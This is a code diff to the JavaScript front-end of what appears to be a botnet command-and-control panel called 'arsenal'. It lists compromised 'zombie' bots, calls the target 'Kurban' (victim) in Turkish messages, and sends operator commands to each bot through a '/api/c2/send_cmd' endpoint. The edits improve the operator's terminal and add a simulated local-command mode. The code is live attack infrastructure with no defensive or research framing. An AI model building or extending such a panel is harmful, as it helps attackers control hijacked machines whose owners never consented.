@@ -490,10 +490,9 @@
                                 }
                             } else {
                                 currentBotId = null;
-                                document.getElementById('bot-cmd-input').style.display = 'none';
                                 document.getElementById('term-prompt').innerHTML = `<i class="fa-solid fa-terminal"></i> root@arsenal:~#`;
                                 document.getElementById('term-prompt').style.color = "var(--accent-primary)";
-                                appendToTerminal(`\n<span style="color:var(--accent-secondary)">[C2] Kurban ile bağlantı koptu.</span>`, true);
+                                appendToTerminal(`\n<span style="color:var(--accent-secondary)">[C2] Kurban ile bağlantı koptu. Terminal yerel moda döndü.</span>`, true);
                             }
                         });
                     }
@@ -503,7 +502,6 @@
 
         function interactBot(botId) {
             currentBotId = botId;
-            document.getElementById('bot-cmd-input').style.display = 'block';
             document.getElementById('bot-cmd-input').focus();
             document.getElementById('term-prompt').innerHTML = `<i class="fa-solid fa-skull-crossbones"></i> zombie_${botId}:~#`;
             document.getElementById('term-prompt').style.color = "var(--accent-secondary)";
@@ -514,9 +512,13 @@
             if(e.key === 'Enter') {
                 const cmd = e.target.value;
                 e.target.value = '';
-                if(!currentBotId) return;
                 
                 appendToTerminal(`\n<span style="color:yellow">> ${cmd}</span>`, true);
+                
+                if(!currentBotId) {
+                    appendToTerminal(`\n<span style="color:var(--accent-primary)">[Local] Execute local cmd (Simulated): ${cmd}</span>`, true);
+                    return;
+                }
                 
                 fetch('/api/c2/send_cmd', {
                     method: 'POST',
@@ -537,7 +539,6 @@
             document.getElementById(`menu-item-botnet`).classList.add('active');
             
             currentBotId = null;
-            document.getElementById('bot-cmd-input').style.display = 'none';
             document.getElementById('term-prompt').innerHTML = `<i class="fa-solid fa-terminal"></i> root@arsenal:~#`;
             document.getElementById('term-prompt').style.color = "var(--accent-primary)";
             pollBots();
@@ -547,7 +548,6 @@
             document.getElementById('tools-grid').style.display = 'grid';
             document.getElementById('botnet-container').style.display = 'none';
             currentBotId = null;
-            document.getElementById('bot-cmd-input').style.display = 'none';
             document.getElementById('term-prompt').innerHTML = `<i class="fa-solid fa-terminal"></i> root@arsenal:~#`;
             document.getElementById('term-prompt').style.color = "var(--accent-primary)";
             
